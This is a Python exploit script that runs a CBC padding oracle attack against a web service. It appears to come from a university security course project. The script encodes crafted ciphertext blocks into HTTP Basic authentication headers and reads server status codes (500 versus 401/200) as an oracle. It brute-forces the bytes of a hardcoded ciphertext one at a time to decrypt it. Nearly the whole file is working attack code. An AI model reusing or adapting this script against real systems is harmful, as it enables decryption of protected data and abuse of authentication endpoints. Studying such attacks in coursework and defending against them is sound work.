#!/usr/bin/env python3
import os
import sys
from pwn import *
import requests

# Ciphertext: 8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96

BLOCK_SIZE = 128
BYTE_NB = BLOCK_SIZE//8

IV = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

target = "http://project-2.csec.chatzi.org:8000/"

# Use this oracle to 
def my_oracle(text):
    text = text.hex() # convert to hex
    
    while True:

        # Setup
        plain_creds = "admin:" + text

        b64_creds = base64.b64encode(plain_creds.encode("utf-8"))
        #print(b64_creds)

        try: # Server errors out, so we try and handle
            response = requests.get(target, headers={"Authorization":"Basic " + b64_creds.decode()})
        except Exception as e:
            print("Got %s error %s, retrying" % (type(e).__name__, e))
            sleep(10)
            print("Retrying..")
            response = requests.get(target, headers={"Authorization":"Basic " + b64_creds.decode()})

        # Sidechannel bit magic, interpreting the astrological map of crypto
        if response.status_code == 500:
            return False
        elif response.status_code == 401 or response.status_code == 200:
            print("Success, current text: ", text)
            return True
        else: # Shouldn't happen
            print("WTF")
            exit()

def poc(encrypted):
    block_number = len(encrypted)//BYTE_NB
    decrypted = bytes()

    request_count = 0

    # Go through each block
    for i in range(block_number, 0, -1):
        current_encrypted_block = encrypted[(i-1)*BYTE_NB:(i)*BYTE_NB]

        # At the first encrypted block, use the initialization vector if it is known
        if(i == 1):
            previous_encrypted_block = bytearray(IV.encode("ascii"))
        else:
            previous_encrypted_block = encrypted[(i-2)*BYTE_NB:(i-1)*BYTE_NB]

        bruteforce_block = previous_encrypted_block
        current_decrypted_block = bytearray(IV.encode("ascii"))
        padding = 0

        # Go through each byte of the block
        for j in range(BYTE_NB, 0, -1):
            padding += 1

            # Bruteforce byte value
            for value in range(0,256):
                bruteforce_block = bytearray(bruteforce_block)
                bruteforce_block[j-1] = (bruteforce_block[j-1] + 1) % 256
                joined_encrypted_block = bytes(bruteforce_block) + current_encrypted_block

                request_count = request_count + 1

                # Ask the oracle
                if(my_oracle(joined_encrypted_block)):
                    current_decrypted_block[-padding] = bruteforce_block[-padding] ^ previous_encrypted_block[-padding] ^ padding

                    # Prepare newly found byte values
                    for k in range(1, padding+1):
                        bruteforce_block[-k] = padding+1 ^ current_decrypted_block[-k] ^ previous_encrypted_block[-k]

                    break
        print("Current request count: ", request_count)

        decrypted = bytes(current_decrypted_block) + bytes(decrypted)

    return decrypted[:-decrypted[-1]]  # Padding removal

usage = """
Usage:
    python3 padding_oracles.py <encrypted_message>
"""

if __name__ == '__main__':
    if len(sys.argv) == 2:
        if len(sys.argv[1]) % 16 != 0:
            print(usage)
        else:
            xxx = poc(bytes.fromhex(sys.argv[1]))
            print("Decrypted message: ", xxx)
    else:
        print(usage)
